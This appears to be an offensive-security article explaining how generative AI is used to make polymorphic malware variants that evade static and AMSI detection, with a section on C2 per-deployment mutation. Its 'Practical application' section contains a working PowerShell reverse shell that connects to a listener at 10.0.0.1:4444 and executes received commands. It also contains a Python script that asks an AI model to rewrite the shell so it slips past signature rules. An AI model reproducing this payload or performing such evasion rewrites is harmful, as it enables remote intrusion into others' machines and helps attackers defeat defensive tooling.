# AI-assisted polymorphism

Classic polymorphic malware rewrote itself using a built-in mutation engine to change
its byte signature while preserving functionality. The approach worked against static
signature matching but could be detected by the mutation engine itself or by
behavioural heuristics applied to the decryption stub.

The current evolution uses generative AI to produce functionally equivalent variants
with genuinely different structure, logic, and syntax — not just encrypted or packed
versions of the same code.

## What changes per variant

Generative models can vary:

Code structure: different control flow, different function decomposition, different
loop constructs that compile to different byte sequences but produce identical output.

Variable and function names: trivially different but eliminates name-based heuristics
in interpreted languages (PowerShell, Python, JavaScript).

Instruction selection: for equivalent operations there are often multiple instruction
sequences. A compiler targeting different optimisation levels or calling conventions
produces different bytes for the same logic.

String encoding: literals can be constructed dynamically, XOR-encoded, split across
concatenation, retrieved from the environment, or assembled from character codes.
Each variant assembles the same string via a different method.

Junk code insertion: dead code that does nothing but changes the binary's statistical
profile and breaks some pattern-matching approaches.

## Practical application

For PowerShell payloads, a language model prompted to produce a variant of a known
technique with different variable names, different string handling, and inserted
innocuous operations produces something that fails most string-based AMSI rules while
preserving function:

```python
import anthropic

client = anthropic.Anthropic()

ORIGINAL = """
$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
"""

response = client.messages.create(
    model="claude-opus-4-6",
    max_tokens=2048,
    messages=[{
        "role": "user",
        "content": f"""Rewrite this PowerShell script to be functionally identical
but with different variable names, restructured control flow, and equivalent
string construction methods. Preserve all functionality exactly.

{ORIGINAL}"""
    }]
)
print(response.content[0].text)
```

Note: this approach works best for interpreted payloads (PowerShell, Python, JavaScript)
where the source is executed directly. For compiled payloads, compilation from a
regenerated source achieves the same goal.

## Limits of the approach

Semantic equivalence is not guaranteed. A language model generating variant code may
introduce subtle bugs, especially in binary protocols, bitwise operations, or
architecture-specific code. Every generated variant must be tested before deployment.

Behavioural detection is not fooled. If the payload's runtime behaviour is distinctive
(specific API call sequences, network communication patterns, characteristic registry
changes), a behaviourally-aware EDR detects the variant regardless of its static
appearance. AI-assisted polymorphism defeats static and signature-based detection; it
does not defeat behavioural analysis.

The defender side has the same tools. EDR vendors use the same generative models to
expand their training data for ML-based detection, producing synthetic variants of
known malware to train classifiers. Generative evasion and generative detection are
on parallel tracks.

## Per-deployment mutation in C2 frameworks

Some C2 frameworks now support per-deployment payload generation: each generated
stager or implant is unique at the binary level, preventing hash-based blocklisting.

This is distinct from runtime polymorphism. The mutation happens at generation time
on the attacker's infrastructure, not at runtime on the target. The result is a
different binary for each operation, but that binary is static once delivered.

Runtime polymorphism (mutation during execution) exists in some advanced implants
but is far harder to implement correctly for compiled code and remains rare outside
nation-state tooling.
